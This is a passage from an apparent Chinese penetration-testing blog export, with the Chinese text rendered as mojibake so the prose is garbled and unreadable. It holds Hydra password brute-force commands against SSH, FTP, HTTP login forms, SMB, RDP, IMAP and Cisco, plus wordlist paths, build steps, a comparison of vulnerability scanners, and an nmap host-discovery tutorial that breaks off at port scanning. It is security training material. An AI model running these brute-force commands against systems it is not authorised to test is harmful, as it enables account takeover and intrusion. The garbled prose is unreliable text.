å¯†ç å­—å…¸ -t çº¿ç¨‹-o save.log -vV ip ssh 2. ç ´è§£ftpï¼š # hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV # hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸-e ns -vV 3.get æ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•ï¼š # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹-vV -e ns ip http-get /admin/ # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹-vV -e ns -f ip http-get /admin/index.php 4.post æ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•ï¼š # hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸-s 80 ip http-post-form â€œ/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry passwordâ€ # hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form â€œlogin.php:id=^USER^&amp;passwd=^PASS^:wrong username or passwordâ€ ï¼ˆå‚æ•°è¯´æ˜ï¼š-tåŒæ—¶çº¿ç¨‹æ•°3ï¼Œ-lç”¨æˆ·åæ˜¯adminï¼Œå­—å…¸pass.txtï¼Œä¿å­˜ä¸ºout.txtï¼Œ-f å½“ç ´è§£äº†ä¸€ä¸ªå¯†ç å°±åœæ­¢ï¼Œ 10.36.16.18ç›®æ ‡ipï¼Œhttp-post-formè¡¨ç¤ºç ´è§£æ˜¯é‡‡ç”¨httpçš„postæ–¹å¼æäº¤çš„è¡¨å•å¯†ç ç ´è§£,ä¸­çš„å†…å®¹æ˜¯è¡¨ç¤ºé”™è¯¯çŒœè§£çš„è¿”å›ä¿¡æ¯æç¤ºã€‚ï¼‰ 5. ç ´è§£httpsï¼š # hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 6. ç ´è§£teamspeakï¼š # hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s ç«¯å£å·-vV ip teamspeak 7. ç ´è§£ciscoï¼š # hydra -P pass.txt 10.36.16.18 cisco # hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 8. ç ´è§£smbï¼š # hydra -l administrator -P top100.txt 192.168.0.102 smb 9. ç ´è§£pop3ï¼š # hydra -l muts -P pass.txt my.pop3.mail pop3 10. ç ´è§£rdpï¼š # hydra 192.168.0.102 rdp -l administrator -P top100.txt -V 11. ç ´è§£http-proxyï¼š # hydra -l admin -P pass.txt http-proxy://10.36.16.18 12. ç ´è§£imapï¼š # hydra -L user.txt -p secret 10.36.16.18 imap PLAIN # hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN æ­¤å·¥å…·å¼ºå¤§ä¹‹å¤„è¿œå¤šäºä»¥ä¸Šæµ‹è¯•ï¼Œå…¶å¯†ç èƒ½å¦ç ´è§£å…³é”®åœ¨äºå¼ºå¤§çš„å­—å…¸ï¼Œå¯¹äºç¤¾å·¥å‹æ¸—é€æ¥è¯´ï¼Œæœ‰æ—¶èƒ½å¤Ÿå¾—åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœ kailå¯†ç å­—å…¸ /usr/share/wfuzz/wordlist/others/names.txt /usr/share/wfuzz/wordlist/others/common_pass.txt åœ¨è¯¥ç•Œé¢æŒ‡å®šç”¨æˆ·åå’Œå¯†ç åˆ—è¡¨æ–‡ä»¶ï¼Œè¿™é‡Œä½¿ç”¨Kaliç³»ç»Ÿä¸­å­˜åœ¨çš„ç”¨æˆ·åå’Œå¯†ç åˆ—è¡¨æ–‡ä»¶ï¼Œå¹¶é€‰æ‹©Loop around usersé€‰é¡¹ã€‚å…¶ä¸­ï¼Œç”¨æˆ·åå’Œå¯†ç æ–‡ä»¶åˆ†åˆ«ä¿å­˜åœ¨/usr/share/wfuzz/wordlist/others/names.txtå’Œ/usr/share/wfuzz/wordlist/others/common_pass.txtä¸­ é™„å½•ï¼šé™„å½•1:hydra: error while loading shared libraries: libssh.so.4:cannot open shared object file: No such file or directory å¦‚æœæ˜¯ubuntuç³»ç»Ÿçš„è¯ï¼Œç›´æ¥apt-get install cmake libssl-devå°±å¯ä»¥äº†ã€‚ä½†æˆ‘ç³»ç»Ÿçš„centOSï¼Œæ²¡æœ‰æ‰¾åˆ°libssl-devè¿™ä¸œè¥¿ã€‚å› ä¸ºæ‰‹#åŠ¨ç¼–è¯‘äº†libssh # yum install cmake # cd /usr/local/src # wget http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz # tar zxf libssh-0.4.8.tar.gz # cd libssh-0.4.8 # mkdir build # cd build # cmake -DCMAKE_INSTALL_PREFIX=/usr -DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON .. # make # make install # /sbin/ldconfig //è¦æ‰§è¡Œè¿™å¥ï¼Œä¸ç„¶ä¼šå‡ºç°hydra: error while loading shared libraries: libssh.so.4: cannot open shared object file: No such file or directory # cd /usr/local/src # wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz # tar zxf hydra-6.3-src.tar.gz # cd hydra-6.3-src # ./configure # make # make install é™„å½•2ï¼š http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html http://www.ha97.com/5186.html","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"æ‰«æå™¨","slug":"æ‰«æå™¨","date":"2019-05-20T14:44:57.000Z","updated":"2020-09-20T08:57:05.672Z","comments":true,"path":"2019/05/20/æ‰«æå™¨/","link":"","permalink":"https://zhangyanlady.github.io/2019/05/20/%E6%89%AB%E6%8F%8F%E5%99%A8/","excerpt":"","text":"æ€»ç»“å›¾ ğŸ‘ºå›½å¤–å„webä¸ç³»ç»Ÿæ¼æ´æ‰«æå™¨ä¼˜ç¼ºç‚¹ğŸ¦„AWVS æ¼æ´æ‰«æé€Ÿåº¦è¾ƒå¿«ï¼Œå‡†ç¡®ç‡è¾ƒé«˜ï¼Œæ¼æ´è§„åˆ™åº“è¾ƒä¸ºå…¨é¢ã€‚æ¼æ´éªŒè¯å¯æŸ¥çœ‹è¯·æ±‚å“åº”ä»£ç ï¼Œä½†æ— ä¸­æ–‡ç•Œé¢ã€‚æŠ¥è¡¨åŠŸèƒ½å®Œæ•´ã€‚æœ‰å¤šé‡æ¼æ´çš„éªŒè¯å·¥å…·ã€‚ ğŸ¦„Appscan æ¼æ´æ‰«æé€Ÿåº¦ä¸€èˆ¬ï¼Œå‡†ç¡®ç‡æœ€é«˜ï¼Œæ¼æ´è§„åˆ™åº“æœ€å…¨é¢ã€‚æ¼æ´éªŒè¯å¯æŸ¥çœ‹è¯·æ±‚ç›¸åº”ä»£ç ï¼Œæ‹¥æœ‰è¾ƒå®Œæ•´çš„æ¼æ´ä¿®å¤å»ºè®®ã€‚æŠ¥è¡¨åŠŸèƒ½å®Œæ•´ã€‚å…¨ä¸­æ–‡ç•Œé¢ ğŸ¦„H**P WebInspect** æ¼æ´æ‰«æé€Ÿåº¦ä¸€èˆ¬ï¼Œå‡†ç¡®ç‡è¾ƒé«˜ï¼Œæ‰«æç±»å‹è¾ƒå¤šã€‚æŠ¥è¡¨åŠŸèƒ½å¼ºå¤§ã€‚å¯æŸ¥çœ‹è¯·æ±‚å“åº”ä»£ç ã€‚æ— ä¸­æ–‡ç•Œé¢ã€‚ ğŸ¦„WebCruiser æ­¤å·¥å…·åå‘æ¸—é€åˆ©ç”¨å·¥å…·ï¼Œæ‰«æåŠŸèƒ½è¾ƒå¼±ã€‚ä»…æœ‰è½»é‡çº§SQLæ³¨å…¥å’ŒXSSæ¼æ´çš„æ‰«æåŠŸèƒ½ã€‚å…·æœ‰SQLæ³¨å…¥æ¼æ´åˆ©ç”¨åŠŸèƒ½ã€‚ ğŸ¦„Nexpose æ‰«æé€Ÿåº¦å¿«ï¼Œèƒ½æ‰«æç³»ç»Ÿå±‚å’Œwebå±‚2ç±»æ¼æ´ï¼Œä½†webæ¼æ´å‘ç°èƒ½åŠ›ä¸å¦‚appscanï¼Œç³»ç»Ÿæ‰«æèƒ½åŠ›ä¸å¦‚Nessusã€‚ ğŸ¦„Nmap ä¸»è¦ç”¨äºç«¯å£æ‰«æå’Œä¸»æœºå‘ç°ï¼Œä¸èƒ½å®ç°webæ‰«æå’Œç³»ç»Ÿå±‚æ‰«æã€‚å¯¹æ¸—é€æµ‹è¯•èµ·å¸®åŠ©ä½œç”¨ã€‚ ğŸ‘ºå›½å†…å„webå’Œç³»ç»Ÿæ¼æ´æ‰«æå™¨ä¼˜ç¼ºç‚¹ ğŸ¦„æ­å·å®‰æ’ æ¼æ´æ‰«æå’Œäº‹ä»¶ç›‘æµ‹æ˜¯å•ä¸€äº§å“å®ç°ã€‚æ¼æ´æ‰«æé€Ÿåº¦è¾ƒæ…¢ï¼›å‘ç°æ¼æ´ç±»å‹è¾ƒå¤šï¼Œç»“æœå‡†ç¡®ã€‚æ¼æ´éªŒè¯åŠŸèƒ½è¾ƒå¥½ã€‚ç»¼åˆå±•ç¤ºç•Œé¢ç›´è§‚ï¼›æŠ¥è¡¨åŠŸèƒ½å®Œæ•´ï¼Œæ”¯æŒä»»åŠ¡ç»“æœå¤šè§’åº¦å¯¹æ¯”ã€‚æ”¯æŒå¼€æ”¾æ¥å£ã€‚æ¼æ´éªŒè¯æä¾›äº†å¿«é€ŸéªŒè¯ï¼Œæµ‹è¯•ç­‰åŠŸèƒ½ï¼Œå¯æŸ¥çœ‹è¯·æ±‚å“åº”ä»£ç ï¼Œæ–¹ä¾¿æŠ€æœ¯äººå‘˜ç¡®è®¤æ¼æ´ã€‚ä½†æ— æ³•æ‰¹é‡éªŒè¯ã€‚ ğŸ¦„çŸ¥é“åˆ›å®‡ æ¼æ´æ‰«æå’Œäº‹ä»¶ç›‘æµ‹æ˜¯å•ä¸€äº§å“å®ç°ã€‚æ¼æ´æ‰«æé€Ÿåº¦å¾ˆå¿«ï¼›å‘ç°æ¼æ´ç±»å‹å…³æ³¨é«˜ä¸­é£é™©ï¼Œç»“æœå‡†ç¡®ï¼›èƒ½è¯†åˆ«ç½‘ç«™é˜²æŠ¤è®¾å¤‡ã€‚æ”¯æŒæ¼æ´éªŒè¯ã€‚ç»¼åˆå±•ç¤ºç•Œé¢ç›´è§‚ï¼Œæœ‰ä¸“ç”¨äºå±•ç¤ºçš„ç•Œé¢ï¼›æŠ¥è¡¨åŠŸèƒ½å®Œæ•´ï¼›æ”¯æŒå¼€æ”¾æ¥å£ã€‚ ğŸ¦„ç»¿ç›Ÿç§‘æŠ€ æ¼æ´æ‰«æå’Œäº‹ä»¶ç›‘æµ‹æ˜¯ä¸¤å¥—äº§å“å®ç°ã€‚æ¼æ´æ‰«æé€Ÿåº¦è¾ƒå¿«ï¼›å‘ç°æ¼æ´ç±»å‹è¾ƒå¤šï¼›ç»“æœå‡†ç¡®ã€‚æ”¯æŒæ¼æ´éªŒè¯ï¼Œæ”¯æŒæ‰¹é‡éªŒè¯ã€‚ç»¼åˆå±•ç¤ºç•Œé¢ä¸€èˆ¬ã€‚æŠ¥è¡¨åŠŸèƒ½è¾ƒä¸ºå®Œæ•´ï¼Œä»¥ä»»åŠ¡ä¸ºå•ä½ã€‚æ”¯æŒå¼€æ”¾æ¥å£ã€‚ ğŸ¦„å®‰å¡ç§‘æŠ€ å…·å¤‡æ¼æ´æ‰«æï¼Œäº‹ä»¶ç›‘æµ‹ä¸å®Œæ•´ï¼ŒæŒ‚é©¬ç›‘æµ‹éœ€è¦ç¡®è®¤ã€‚ æ¼æ´æ‰«æé€Ÿåº¦å¾ˆå¿«ï¼Œå‘ç°æ¼æ´ç±»å‹è¾ƒå¤šï¼Œç»“æœè¾ƒä¸ºå‡†ç¡®ï¼›æ”¯æŒæ¼æ´éªŒè¯ï¼›ç»¼åˆå±•ç¤ºç•Œé¢å’ŒæŠ¥è¡¨åŠŸèƒ½è¾ƒä¸ºç®€å•ã€‚ ğŸ¦„å›½èˆœç§‘æŠ€ æ¼æ´æ‰«æå’Œäº‹ä»¶ç›‘æµ‹æ˜¯å•ä¸€äº§å“å®ç°ã€‚ æ¼æ´æ‰«æé€Ÿåº¦å¾ˆå¿«ï¼Œå‘ç°æ¼æ´ç±»å‹è¾ƒå°‘ï¼Œç»“æœè¯¯å·®è¾ƒå¤§ã€‚ä¸æ”¯æŒæ¼æ´éªŒè¯ã€‚ç»¼åˆå±•ç¤ºç•Œé¢ç›´è§‚ï¼ŒæŠ¥è¡¨åŠŸèƒ½è¾ƒä¸ºå®Œæ•´ã€‚ ğŸ¦„å®‰åŸŸé¢†åˆ› ä»…æœ‰æ¼æ´æ‰«æåŠŸèƒ½ï¼Œæ— äº‹ä»¶ç›‘æµ‹åŠŸèƒ½ã€‚ æ¼æ´æ‰«æé€Ÿåº¦å¾ˆå¿«ï¼Œå‘ç°æ¼æ´ç±»å‹ä¸€èˆ¬ï¼Œç»“æœè¾ƒä¸ºå‡†ç¡®ï¼›æ”¯æŒæ¼æ´éªŒè¯ï¼Œä¸æ”¯æŒè¯¯æŠ¥ä¿®æ­£ï¼›ç»¼åˆå±•ç¤ºå’ŒæŠ¥è¡¨åŠŸèƒ½è¾ƒä¸ºç®€å•ã€‚æ”¯æŒå¼€æ”¾æ¥å£ã€‚ ğŸ¦„å¯æ˜æ˜Ÿè¾° æ¼æ´æ‰«æä¸æ”¯æŒé›†ç¾¤éƒ¨ç½²ï¼Œä¸å…·å¤‡äº‹ä»¶ç›‘æµ‹åŠŸèƒ½ã€‚ æ¼æ´æ‰«æé€Ÿåº¦ä¸€èˆ¬ï¼Œå‘ç°æ¼æ´ç±»å‹ä¸€èˆ¬ï¼Œç»“æœå‡†ç¡®æ€§ä¸€èˆ¬ã€‚ä¸æ”¯æŒæ¼æ´éªŒè¯ã€‚ ğŸ‘€nessuså®‰è£…ä¸ä½¿ç”¨ä¸‹è½½åœ°å€https://zh-cn.tenable.com/products/nessus?tns_redirect=true Nessus v8.10ç³»åˆ—å¹¶æ¿€æ´»æˆæ— IPé™åˆ¶ç‰ˆæœ¬è¯¦ç»†é“¾æ¥ï¼šhttps://www.jianshu.com/p/1d95550ffc81 appscanä½¿ç”¨ nmap 0x01 ä»‹ç»Nmapï¼Œä¹Ÿå°±æ˜¯Network Mapperï¼Œä¸­æ–‡ä¸ºâ€œç½‘ç»œæ˜ å°„å™¨â€ã€‚ Nmapæ˜¯ä¸€æ¬¾å¼€æºçš„ç½‘ç»œæ¢æµ‹å’Œå®‰å…¨å®¡æ ¸çš„å·¥å…·ï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯å¿«é€Ÿåœ°æ‰«æå¤§å‹ç½‘ç»œã€‚ å®ƒæ˜¯ç½‘ç»œç®¡ç†å‘˜å¿…ç”¨çš„è½¯ä»¶ä¹‹ä¸€ï¼Œä»¥åŠç”¨ä»¥è¯„ä¼°ç½‘ç»œç³»ç»Ÿä¿å®‰ã€‚ 1.1 åŸºæœ¬åŠŸèƒ½ï¼ˆ1ï¼‰æ¢æµ‹ä¸€ç»„ä¸»æœºæ˜¯å¦åœ¨çº¿ ï¼ˆ2ï¼‰æ‰«æä¸»æœºç«¯å£ï¼Œå—…æ¢æ‰€æä¾›çš„ç½‘ç»œæœåŠ¡ ï¼ˆ3ï¼‰æ¨æ–­ä¸»æœºæ‰€ç”¨çš„æ“ä½œç³»ç»Ÿ 1.2 å·¥ä½œåŸç†Nmapå¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œä¸€ç³»åˆ—çš„æµ‹è¯•ï¼Œåˆ©ç”¨æµ‹è¯•ç»“æœå»ºç«‹ç›¸åº”ç›®æ ‡ä¸»æœºçš„NmapæŒ‡çº¹ï¼Œç„¶åNmapä¼šå¯¹æŒ‡çº¹è¿›è¡ŒåŒ¹é…ï¼Œæœ€ç»ˆè¾“å‡ºç›¸åº”çš„ç»“æœã€‚ 1.3 è¯­æ³•æ ¼å¼Nmapçš„å›ºå®šè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š Nmapã€ç©ºæ ¼ã€‘ã€é€‰é¡¹|å¤šé€‰é¡¹|åè®®ã€‘ã€ç©ºæ ¼ã€‘ã€ç›®æ ‡ã€‘ 0x02 å¸¸ç”¨å‚æ•° 2.1 å…¨é¢æ‰«æå…¨é¢æ‰«ææŒ‡å®šIPæˆ–åŸŸåçš„æ‰€æœ‰ç«¯å£åŠå…¶ç›®æ ‡ç³»ç»Ÿä¿¡æ¯ç­‰ã€‚æ‰€éœ€æ—¶é—´è¾ƒé•¿ nmap -A 192.168.0.12 æ‰«æç»“æœï¼šç›®æ ‡ä¸»æœºMACåœ°å€ã€è®¾å¤‡ç±»å‹ã€æ“ä½œç³»ç»Ÿã€ä¸­å¤®å¤„ç†å•å…ƒã€ä¸»æœºè¯¦ç»†èµ„æ–™ã€ç½‘ç»œè·ç¦»ç­‰ 2.2 ç®€å•æ‰«æè¯¥æ‰«ææ–¹å¼å¯ä»¥é’ˆå¯¹IPæˆ–è€…åŸŸåè¿›è¡Œæ‰«æï¼Œæ‰«ææ–¹å¼è¿…é€Ÿï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å‘ç°ç›® æ ‡ç«¯å£çš„å¼€æ”¾æƒ…å†µåŠä¸»æœºåœ¨çº¿æƒ…å†µã€‚ nmap 192.168.0.12 ç®€å•æ‰«æç»“æœï¼šï¼ˆåªèƒ½æ‰«æå·¥å…·è§„å®šçš„ä¸€äº›å¸¸è§ç«¯å£ï¼‰ 2.3 å…¶ä»–ä¸¾ä¾‹æŒ‡å®šæ‰«æä¸€ä¸ªç½‘æ®µï¼šnmap 192.168.0.0/24 æˆ–è€… nmap 192.168.0.1-200ï¼ˆæ‰«æ1-200çš„ä¸»æœºï¼‰ æ‰«æéƒ¨åˆ†ç½‘æ®µï¼ˆé€—å·éš”å¼€ï¼‰ï¼šnmap 192.168.0.1,2,3,4 æˆ– nmap 192.168.0,1,2,3,4.1 æ‰«ææŒ‡å®šIPæ‰€å¼€æ”¾çš„ç«¯å£ï¼šnmap -p 1-65535 -v 127.0.0.1 æ‰«æCæ®µå­˜æ´»ä¸»æœºï¼šnmap 192.168.1.0/24 æŒ‡å®šç«¯å£æ‰«æï¼šnmap -p 80,1433,22,1521 192.168.1.1 æ¢æµ‹ä¸»æœºæ“ä½œç³»ç»Ÿï¼šnmap -O 192.168.1.1 å…¨é¢çš„ç³»ç»Ÿæ¢æµ‹ï¼šnmap -v -A 192.168.1.1ï¼ˆNmapé»˜è®¤æ‰«æä¸»æœº1000ä¸ªé«˜å±ç«¯å£ï¼‰ ç©¿é€é˜²ç«å¢™è¿›è¡Œæ‰«æï¼šnmap -Pn -A 192.168.1.1ï¼ˆç¦æ­¢ç”¨pingçš„ï¼‰ ä½¿ç”¨è„šæœ¬æ‰«æWebæ•æ„Ÿç›®å½•ï¼šnmap -p 80 â€“script=http-enum.nse 192.168.1.1 0x03 ä¸»æœºå‘ç° 3.1 Pingæ‰«æPingæ‰«æåªè¿›è¡Œpingï¼Œç„¶åæ˜¾ç¤ºå‡ºåœ¨çº¿çš„ä¸»æœºã€‚ä½¿ç”¨è¯¥é€‰é¡¹æ‰«æå¯ä»¥è½»æ˜“è·å–ç›®æ ‡ä¿¡æ¯è€Œä¸ä¼šè¢«è½»æ˜“å‘ç°ã€‚ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmapä¼šå‘é€ä¸€ä¸ªICMPå›å£°è¯·æ±‚å’Œä¸€ä¸ªTCPæŠ¥æ–‡åˆ°ç›®æ ‡ç«¯å£ã€‚Pingæ‰«æçš„ä¼˜ç‚¹æ˜¯ä¸ä¼šè¿”å›å¤ªå¤šçš„ä¿¡æ¯å½±å“å¯¹ç»“æœçš„åˆ†æï¼Œå¹¶ä¸”æ‰«ææ–¹å¼é«˜æ•ˆã€‚ nmap -sP 192.168.0.0/24 3.2 æ— Pingæ‰«ææ— pingæ‰«æé€šå¸¸ç”¨äºé˜²ç«å¢™ç¦æ­¢pingçš„æƒ…å†µä¸‹ï¼Œå®ƒèƒ½ç¡®å®šæ­£åœ¨è¿è¡Œçš„æœºå™¨ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œnmapåªå¯¹æ­£åœ¨è¿è¡Œçš„ä¸»æœºè¿›è¡Œé«˜å¼ºåº¦çš„æ¢æµ‹ï¼Œå¦‚ç«¯å£æ‰«æï¼Œç‰ˆæœ¬æ¢æµ‹æˆ–è€…æ“ä½œç³»ç»Ÿæ¢æµ‹ã€‚ ç”¨-P0ç¦æ­¢ä¸»æœºå‘ç°ä¼šä½¿nmapå¯¹æ¯ä¸€ä¸ªç‰¹å®šçš„ç›®æ ‡IPåœ°å€è¿›è¡Œæ‰€è¦æ±‚çš„æ‰«æï¼Œè¿™å¯ä»¥ç©¿é€é˜²ç«å¢™ï¼Œä¹Ÿå¯ä»¥é¿å…è¢«é˜²ç«å¢™å‘ç°ã€‚ nmap -P0 192.168.0.12 3.3 TCP SYN Ping æ‰«æé€šå¸¸æƒ…å†µä¸‹ï¼Œnmapé»˜è®¤æ˜¯ä½¿ç”¨TCP ACK å’Œ ICMP Echo è¯·æ±‚å¯¹ç›®æ ‡è¿›è¡Œæ˜¯å¦å­˜æ´»çš„å“åº”ï¼Œå½“ç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™é˜»æ­¢è¿™äº›è¯·æ±‚æ—¶ï¼Œå¯ä»¥ä½¿ç”¨TCP SYN Pingæ‰«ææ¥åˆ¤æ–­ä¸»æœºæ˜¯å¦å­˜æ´»ã€‚ -PS é€‰é¡¹å‘é€ä¸€ä¸ªè®¾ç½®äº†SYNæ ‡å¿—ä½çš„ç©ºTCPæŠ¥æ–‡ã€‚é»˜è®¤ç«¯å£ä¸º80ã€‚ ä½†ä¸åŒçš„ç«¯å£ä¹Ÿå¯ä»¥ä½œä¸ºé€‰é¡¹æŒ‡å®šï¼Œç”šè‡³å¯ä»¥æŒ‡å®šä¸€ä¸ªä»¥é€—å·åˆ†éš”çš„ç«¯å£åˆ—è¡¨ï¼ˆå¦‚-PS22,23,25,80,115,3306,3389ï¼‰ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªç«¯å£ä¼šè¢«å¹¶å‘åœ°æ‰«æ nmap -PS -v 192.168.0.12 ä¸Šé¢ç»“æœå¯å¾—çŸ¥Nmapæ˜¯é€šè¿‡SYN/ACKå’ŒRSTå“åº”æ¥å¯¹ç›®æ ‡ä¸»æœºæ˜¯å¦å­˜æ´»è¿›è¡Œåˆ¤æ–­ï¼Œä½†åœ¨ç‰¹å®šæƒ…å†µä¸‹é˜²ç«å¢™ä¼šä¸¢å¼ƒRSTåŒ…ã€‚ è¿™æ—¶ç»“æœä¼šä¸å‡†ç¡®ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šä¸€ä¸ªç«¯å£æˆ–ç«¯å£èŒƒå›´æ¥é¿å…è¿™ç§æƒ…å†µã€‚ nmap -PS80,100-200 -v 192.168.0.12 3.4 TCP ACK Ping æ‰«æä½¿ç”¨-PAé€‰é¡¹å¯ä»¥è¿›è¡ŒTCP ACK Pingæ‰«æï¼Œå®ƒä¸TCP SYN Pingæ‰«æéå¸¸ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºè®¾ç½®çš„TCPæ ‡å¿—ä½æ˜¯ACKè€Œä¸æ˜¯SYNï¼Œä½¿ç”¨è¿™ç§æ–¹å¼æ‰«æå¯ä»¥æ¢æµ‹é˜»æ­¢SYNåŒ…æˆ–ICMP Echoè¯·æ±‚çš„ä¸»æœºã€‚ nmap -PA -v 192.168.0.12 åŒæ—¶ä½¿ç”¨-SPä¸-PAé€‰é¡¹å‘½ä»¤å¦‚ä¸‹ï¼š nmap -PA -PS 192.168.0.12 3.5 UDP Pingæ‰«æä½¿ç”¨UDP Pingæ‰«ææ—¶Nmapä¼šå‘é€ä¸€ä¸ªç©ºUDPåŒ…åˆ°ç›®æ ‡ä¹‹é—´ï¼Œå¦‚æœç›®æ ‡ä¸»æœºç›¸åº”åˆ™è¿”å›ä¸€ä¸ªICMPç«¯å£ä¸å¯è¾¾é”™è¯¯ï¼Œå¦‚æœç›®æ ‡ä¸»æœºä¸æ˜¯å­˜æ´»çŠ¶æ€åˆ™ä¼šè¿”å›å„è‡ªICMPé”™è¯¯ä¿¡æ¯ã€‚ nmap -PU -v 192.168.0.12 3.6 ICMP Ping Types æ‰«æICMPæ˜¯æ§åˆ¶æŠ¥æ–‡åè®®ã€‚nmapå‘é€ä¸€ä¸ªICMP type8ï¼ˆå›å£°è¯·æ±‚ï¼‰æŠ¥æ–‡åˆ°ç›®æ ‡ipåœ°å€ï¼Œä»è¿è¡Œçš„ä¸»æœºå¾—åˆ°ä¸€ä¸ªtype0ï¼ˆå›å£°ç›¸åº”ï¼‰æŠ¥æ–‡ã€‚ -PEé€‰é¡¹ç®€å•çš„æ¥è¯´æ˜¯é€šè¿‡å‘ç›®æ ‡å‘é€ICMP Echoæ•°æ®åŒ…æ¥æ¢æµ‹ç›®æ ‡ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œä½¿ç”¨-PEé€‰é¡¹æ‰“å¼€è¯¥å›å£°è¯·æ±‚åŠŸèƒ½ã€‚ -PPé€‰é¡¹æ˜¯ICMPæ—¶é—´æˆ³pingæ‰«æï¼Œ-PMé€‰é¡¹å¯ä»¥è¿›è¡Œicmpåœ°å€æ©ç pingæ‰«æ nmap-PE-v192.168.0.12nmap-PP-v192.168.0.12nmap-PM-v192.168.0.12 3.7 ARP Pingæ‰«æ-PR é€šå¸¸åœ¨æ‰«æå±€åŸŸç½‘æ—¶ä½¿ç”¨ï¼Œåœ¨å†…ç½‘çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ARP pingæ‰«ææ–¹å¼æ˜¯æœ€æœ‰æ•ˆçš„ï¼Œåœ¨æœ¬åœ°å±€åŸŸç½‘ä¸­é˜²ç«å¢™ä¸ä¼šç¦æ­¢ARPè¯·æ±‚ï¼Œè¿™å°±ä½¿å¾—å®ƒæ¯”å…¶ä»–pingæ‰«æéƒ½æ›´åŠ é«˜æ•ˆã€‚ nmap -PR 192.168.0.12 3.8 æ‰«æåˆ—è¡¨åˆ—è¡¨æ‰«ææ—¶ä¸»æœºå‘ç°çš„é€€åŒ–å½¢å¼ï¼Œå®ƒä»…ä»…åˆ—å‡ºæŒ‡å®šç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºï¼Œä¸å‘é€ä»»ä½•æŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœºã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmapä»ç„¶å¯¹ä¸»æœºè¿›è¡Œåå‘åŸŸåè§£æä»¥è·å–å®ƒä»¬çš„åå­—ã€‚ nmap -sL 192.168.0.0/24 3.9 ç¦æ­¢åå‘åŸŸåè§£æå¦‚æœå•çº¯æ‰«æä¸€æ®µIPï¼Œä½¿ç”¨è¯¥é€‰é¡¹å¯ä»¥å¤§å¹…åº¦å‡å°‘ç›®æ ‡ä¸»æœºçš„ç›¸åº”æ—¶é—´ï¼Œä»è€Œæ›´å¿«çš„å¾—åˆ°ç»“æœã€‚ namp -n -sL 192.168.0.0/24 3.10åå‘åŸŸåè§£ænmap -R -sL *. 192.168.0.0/24 3.11 æ‰«æTPv6åœ°å€nmap -6 fe80::20c:29ff:fee0:2e76 3.12 è·¯ç”±è·Ÿè¸ªé€šè¿‡æ­¤é€‰é¡¹å¯ä»¥è½»æ¾åœ°æŸ¥æ‰¾å‡ºæœ¬åœ°è®¡ç®—æœºåˆ°ç›®æ ‡ä¹‹é—´æ‰€ç»è¿‡çš„ç½‘ç»œèŠ‚ç‚¹ï¼Œå¹¶å¯ä»¥çœ‹åˆ°é€šè¿‡å„ä¸ªèŠ‚ç‚¹çš„æ—¶é—´ã€‚ nmap â€“traceroute -v www.baidu.com 3.13 SCTP INIT Pingæ‰«æSCTPï¼ˆæµæ§åˆ¶ä¼ è¾“åè®®ï¼‰æ˜¯IETFåœ¨2000å¹´å®šä¹‰çš„ä¸€ä¸ªä¼ è¾“å±‚åè®®ã€‚ SCTPå¯ä»¥çœ‹ä½œæ˜¯TCPåè®®çš„æ”¹è¿›ï¼Œå®ƒæ”¹è¿›äº†TCPçš„ä¸€äº›ä¸è¶³ï¼ŒSCTP INIT Pingæ‰«æé€šè¿‡å‘ç›®æ ‡å‘é€INITåŒ…ï¼Œæ ¹æ®ç›®æ ‡ä¸»æœºçš„ç›¸åº”åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦å­˜æ´»ã€‚ nmap -PY -v 192.168.0.12 0x04 ç«¯å£æ‰«æ 4.1 